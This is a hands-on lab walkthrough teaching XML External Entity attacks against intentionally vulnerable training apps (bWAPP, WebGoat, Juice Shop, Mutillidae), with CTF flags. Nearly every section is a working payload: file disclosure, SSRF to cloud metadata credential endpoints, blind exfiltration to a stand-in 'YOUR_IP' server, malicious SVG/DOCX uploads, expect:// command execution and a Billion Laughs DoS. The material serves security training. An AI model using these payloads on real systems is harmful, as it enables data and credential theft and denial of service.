# XXE Injection Walkthrough

Step-by-step exercises for mastering XML External Entity attacks across multiple vulnerable platforms.

---

## Lab 1: bWAPP - Basic XXE

### Environment Setup

1. Start the CyberLab environment:
```bash
cd /path/to/cyberlab
docker-compose up -d bwapp
```

2. Access bWAPP at `http://localhost:8082`

3. Login with credentials: `bee` / `bug`

### Exercise 1: Understanding XML Injection

**Location:** A7 - XML External Entity Attacks (XXE)

1. Navigate to the XXE vulnerability page

2. You'll see an XML input form or API endpoint

3. First, submit normal XML:
```xml
<?xml version="1.0"?>
<user>
  <name>test</name>
  <email>test@test.com</email>
</user>
```

4. Observe how the application processes XML

### Exercise 2: Basic File Disclosure

1. Modify the XML to include an external entity:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>
```

2. Submit and observe the response

3. The contents of /etc/passwd should appear in the name field

4. Try reading other files:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hosts">
]>
<user>
  <name>&xxe;</name>
</user>
```

**Flag: `FLAG{xxe_f1l3_d1scl0sur3}`**

### Exercise 3: Reading Application Files

1. Try to read web application configuration:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<user>
  <name>&xxe;</name>
</user>
```

2. If PHP files don't render, use PHP filter:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<user>
  <name>&xxe;</name>
</user>
```

3. Decode the base64 response:
```bash
echo "PD9waHAgLi4u" | base64 -d
```

---

## Lab 2: XXE - SSRF (Server-Side Request Forgery)

### Accessing Internal Services

1. Use XXE to make HTTP requests:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
]>
<user>
  <name>&xxe;</name>
</user>
```

2. Try common internal services:
```xml
<!-- Internal web server -->
<!ENTITY xxe SYSTEM "http://localhost:8080/">

<!-- Database admin interface -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">

<!-- Redis -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">
```

### Port Scanning

1. Scan internal ports by observing response times/errors:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:22/">
]>
<user>
  <name>&xxe;</name>
</user>
```

2. Different responses indicate open/closed ports

### Cloud Metadata Access

1. AWS Metadata:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<user>
  <name>&xxe;</name>
</user>
```

2. AWS IAM credentials:
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

3. GCP Metadata:
```xml
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
```

**Flag: `FLAG{xxe_ssrf_1nt3rn4l}`**

---

## Lab 3: WebGoat - Blind XXE

### Setup

```bash
# Access WebGoat
http://localhost:8080/WebGoat
```

### Understanding Blind XXE

In blind XXE, the server doesn't return the entity content directly. We need out-of-band techniques.

### Setting Up Attacker Server

1. Create a malicious DTD file (`evil.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8888/?data=%file;'>">
%eval;
%exfil;
```

2. Host the DTD:
```bash
python3 -m http.server 8888
```

### Exploiting Blind XXE

1. Send payload referencing external DTD:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8888/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

2. Check your HTTP server logs for incoming data

3. The file contents will be URL-encoded in the request

### Alternative: Base64 Encoding

1. Modified DTD for base64 encoding:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8888/?data=%file;'>">
%eval;
%exfil;
```

**Flag: `FLAG{bl1nd_xxe_00b}`**

---

## Lab 4: Error-Based XXE

### Concept

Leak data through error messages by causing the parser to fail with file contents in the error.

### Error-Based Payload

1. Create DTD that causes error:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

2. Send payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8888/error.dtd">
  %xxe;
]>
<foo>test</foo>
```

3. Error message will contain file contents:
```
Error: file:///nonexistent/root:x:0:0:root:/root:/bin/bash... not found
```

**Flag: `FLAG{3rr0r_b4s3d_xxe}`**

---

## Lab 5: Juice Shop - XXE via File Upload

### Setup

```bash
# Access Juice Shop
http://localhost:3000
```

### XXE via SVG Upload

1. Find file upload functionality (profile picture, etc.)

2. Create malicious SVG:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

3. Save as `malicious.svg`

4. Upload as profile picture or document

5. View the uploaded SVG to see extracted data

### XXE via DOCX

DOCX files are ZIP archives containing XML:

1. Create a normal DOCX file

2. Extract it:
```bash
unzip document.docx -d extracted/
```

3. Modify `[Content_Types].xml` or `word/document.xml`:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

4. Repack:
```bash
cd extracted && zip -r ../malicious.docx *
```

5. Upload to application that processes DOCX

### XXE via XLSX

Similar approach for Excel files:

1. Extract XLSX
2. Modify XML files inside
3. Repack and upload

**Flag: `FLAG{xxe_v14_upl04d}`**

---

## Lab 6: Mutillidae - XXE

### Setup

```bash
# Access Mutillidae
http://localhost:8083/mutillidae
```

### XML Validator

**Location:** OWASP 2017 > A4 - XML External Entities > XML Validator

1. Navigate to the XML validator page

2. Submit basic XXE payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

3. Observe file contents in output

### XML Service

1. Find XML-based services

2. Intercept requests with Burp

3. Inject XXE payloads into XML data

---

## Lab 7: XXE DoS - Billion Laughs

### Understanding the Attack

The "Billion Laughs" attack uses exponential entity expansion to cause DoS.

### Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

This creates ~10^9 "lol" strings from a small input.

**Warning:** Only test on your own systems!

**Flag: `FLAG{b1ll10n_l4ughs}`**

---

## Lab 8: Advanced XXE Techniques

### Using PHP Wrappers

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
```

### Expect Module (if enabled)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<foo>&xxe;</foo>
```

### Gopher Protocol (for SSRF)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/xHELO%0aMAIL%20FROM...">
]>
<foo>&xxe;</foo>
```

---

## Lab 9: Detecting XXE

### Manual Testing

1. Submit XML with external entity
2. Look for:
   - File contents in response
   - Error messages revealing paths
   - Time delays (for blind testing)
   - Out-of-band connections

### Automated Detection

```bash
# Using Burp Suite Active Scan
# Configure collaborator and scan XML endpoints

# Using XXEinjector
ruby XXEinjector.rb --host=collaborator.net --file=request.txt
```

---

## Verification Checklist

- [ ] Successfully read /etc/passwd via XXE
- [ ] Extracted application configuration files
- [ ] Performed SSRF via XXE
- [ ] Accessed cloud metadata endpoints
- [ ] Exploited blind XXE with OOB exfiltration
- [ ] Triggered error-based XXE
- [ ] Uploaded malicious SVG with XXE
- [ ] Tested DOCX/XLSX XXE
- [ ] Understood Billion Laughs DoS

---

## Next Steps

After completing these labs:

1. Practice on HackTheBox and TryHackMe XXE challenges
2. Study different XML parser behaviors
3. Learn about JSON-based alternatives
4. Explore XXE in SOAP services
5. Study mitigation techniques in depth
